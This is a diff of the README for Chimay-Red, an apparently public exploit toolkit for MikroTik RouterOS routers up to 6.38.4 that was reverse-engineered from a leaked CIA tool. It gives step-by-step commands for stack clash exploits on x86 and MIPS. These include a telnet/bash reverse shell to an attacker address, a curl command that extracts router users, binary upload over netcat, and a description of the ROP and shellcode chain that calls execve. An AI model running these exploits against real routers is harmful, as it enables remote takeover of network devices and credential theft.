@@ -1,7 +1,7 @@
 # Chimay-Red
 Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks  
 
-See the PDF for more info 
+See the [PDF](docs/ChimayRed.pdf) for more info (not updated)  
 
 # Vulnerable versions  
 Until RouterOS 6.38.4  
@@ -16,13 +16,25 @@ Simple crash sending -1 as content-length in post header
 ## StackClashPOC  
 Stack clash exploit using two threads, missing ROP chain
 
-# Working exploits
+# Working exploits  
+As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
+(It's placed in `/nova/bin/`)  
+Check that the running version is the same.  
+To simplify extraction you can use:
+```
+$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
+```  
+
 ## StackClash_x86  
 Stack clash exploit using two threads  with ROP chain to run bash commands  
 
 ### For a reverse shell:  
+In a shell:  
 ```
-$ nc -l -p 1234  # (in another shell)
+$ nc -l -p 1234 
+```  
+In another shell:
+```
 $ ./StackClash_x86.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
 ```
 Where:  
@@ -36,20 +48,11 @@ $ sleep 3 # (wait some seconds that www is restarted)
 $ curl -s http://192.168.8.1/winbox/index | ./tools/extract_user.py -
 ```
 
-As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
-(It's placed in `/nova/bin/`)  
-Check that the running version is the same.  
-To simplify extraction you can use:
-```
-$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
-```
-
 ## StackClash_mips  
 Stack clash exploit using two threads with ROP chain + shell code to run bash commands  
 On mips version of www the stack is RWX, so we can jump to the stack.
 
-You can run the same bash command as the x86 version.  
-The exploit is dynamically created, so it should work on any version minor than 6.38.4.  
+You can run the same bash command as the x86 version.   
 
 ### LCD  
 Funny command  
@@ -60,12 +63,17 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)  
 
 ### Upload binaries
-On PC run:  
+To upload `busybox-mips` in `/ram/busybox`  
+In a shell:
 ```
 $ hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g" | nc -l -q 0 -p 1234
 ```  
-In another shell run reverse shell command.  
-Once the file is uploaded, run again reverse shell (this time only with `nc -l -p 1234`) and you will find busybox inside `/ram/`.
+In another shell (note that this is the reverse shell command):
+```
+$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
+```
+and wait until the connection automatically close.  
+(Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)
 
 # FAQ
 #### Where does one get the chimay-red.py file, that this tool kit relies on?  
@@ -96,7 +104,3 @@ A small ROP (3 gadgets) find the address of a location on the stack (where I put
 In the shell code I populate an array of 4 pointers with the address of the strings "/bin/bash", "-c", "your_shell_cmd" using the leaked address of the stack (the last pointer is left NULL).  
 Then I populate a0, a1, a2 with rispectively: address of "/bin/bash", address of the array populated at the preceeding step and the address of the NULL entry of the array.  
 At this point I can launch the syscall 4011 (execve) to execute my bash command.  
-
-# Comments  
-- On very old versions like 6.18, the stack size is not 128KB, so the exploit doesn't work, i'll fix it in the future  
-- If the exploit doesn't work on recent version, make it crash with CrashPOC 3 or 4 times, then launch immediately StackClash and it will work  
